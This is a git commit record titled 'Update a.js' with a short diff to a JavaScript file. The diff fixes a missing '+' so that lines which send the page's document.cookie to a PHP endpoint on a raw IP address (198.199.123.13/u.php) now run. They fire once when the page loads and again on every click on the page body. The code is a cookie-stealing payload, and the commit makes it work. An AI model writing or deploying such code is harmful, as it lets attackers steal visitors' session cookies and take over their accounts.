762afabfb1eebfada0796c08152e83e596e15ec9
ZiYuan Han <onbpazy@163.com>
2016-05-04 11:17:07 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,4 +1,4 @@
-window.open('//198.199.123.13/u.php?c='+document.cookie+"&d="document.cookie);
+window.open('//198.199.123.13/u.php?c='+document.cookie+"&d="+document.cookie);
 document.body.addEventListener('click', function() {
-            window.open('//198.199.123.13/u.php?c='+document.cookie+"&d="document.cookie);
+            window.open('//198.199.123.13/u.php?c='+document.cookie+"&d="+document.cookie);
         });
